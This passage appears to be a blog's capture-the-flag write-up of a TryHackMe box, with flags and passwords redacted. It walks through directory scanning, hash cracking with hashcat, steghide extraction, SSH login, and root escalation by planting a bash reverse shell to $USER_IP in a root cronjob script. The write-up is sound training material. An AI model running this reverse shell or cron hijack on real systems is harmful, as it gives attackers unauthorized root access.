flag{__________}
</code></pre></div><h3 id="flag-2">Flag 2</h3>
<p>Using gobuster we have found <code>robots.txt</code> in the Apache server which shous us
<strong>User-Agent</strong>.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">User-Agent:*
Disallow:/
Robots Not Allowed
User-Agent:a______________________________0
Allow:/
This Flag Can Enter But Only This Flag No More Exceptions
</code></pre></div><p>The solution wasn&rsquo;t so good. You have to find the solution online in some
obscure site searching for the hash :thinking:&hellip;</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">flag{______________}
</code></pre></div><h3 id="flag-3">Flag 3</h3>
<p>On the Apache home page we can find the third flag.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Fl4g 3 : flag{________________________________}
</code></pre></div><h3 id="user-flag">User Flag</h3>
<p>On the Apache main page in the source we can see an hidden <code>p</code> again.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#6ab825;font-weight:bold">p</span> <span style="color:#bbb">hidden</span>&gt;its encoded with ba....:O______________________u&lt;/<span style="color:#6ab825;font-weight:bold">p</span>&gt;
</code></pre></div><p>Since it is encoded with a base we open <a href="https://gchq.github.io/CyberChef/">Chyberchef</a> and try out a bunch of encodings.</p>
<p>With <code>base62</code> we can find something that looks like an hidden directory.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">/n0th1ng3ls3m4tt3r
</code></pre></div><p>On this page we find a long string and an image.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#6ab825;font-weight:bold">p</span>&gt;9______________________________________________________________1&lt;/<span style="color:#6ab825;font-weight:bold">p</span>&gt;
</code></pre></div><p>The hint tell us that it&rsquo;s GHOST, so we use <code>hashcat</code> and the wordlist that was
provided to crack it.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#3677a9">0</span> -m <span style="color:#3677a9">6900</span> hash.txt easypeasy.txt
</code></pre></div><p>With a bit of guessing we can use <code>steghide</code> on the image to extract some data.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">steghide extract -sf binarycodepixabay.jpg -p mypasswordforthatjob
</code></pre></div><p>The output are user and password information, the password is encoded in binary.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username:b____g
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
</code></pre></div><p>Using Cyberchef we can get the credentials.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">username: b____g
password: i__________________________y
</code></pre></div><p>Those are the credentials for the SSH. So when you access you can find the user
flag.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a______________y}
</code></pre></div><p>Which is a <code>rot13</code> of <code>flag{________________}</code>.</p>
<h3 id="root-flag">Root Flag</h3>
<p>Uploading <a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite">Linpeas</a>
on the box we can find a cronjob that is run as root and execute a script
<code>/var/www/.mysecretcronjob.sh</code>.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">* *    * * *   root    cd /var/www/ &amp;&amp; sudo bash .mysecretcronjob.sh
</code></pre></div><p>We can put a reverse shell in the script to gain root access on the box.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/<span style="color:#40ffff">$USER_IP</span>/9000 0&gt;&amp;<span style="color:#3677a9">1</span>
</code></pre></div><p>Open a listener and wait for the job to fire.</p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">nc -lvnp <span style="color:#3677a9">9000</span>
</code></pre></div><p>The root flag is in a file <code>/root/.root.txt</code></p>
<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">flag{________________________________}
</code></pre></div>]]></content><category scheme="https://joshuachp.github.io/tags/ctf" term="ctf" label="CTF"/><category scheme="https://joshuachp.github.io/tags/thm" term="thm" label="THM"/></entry></feed>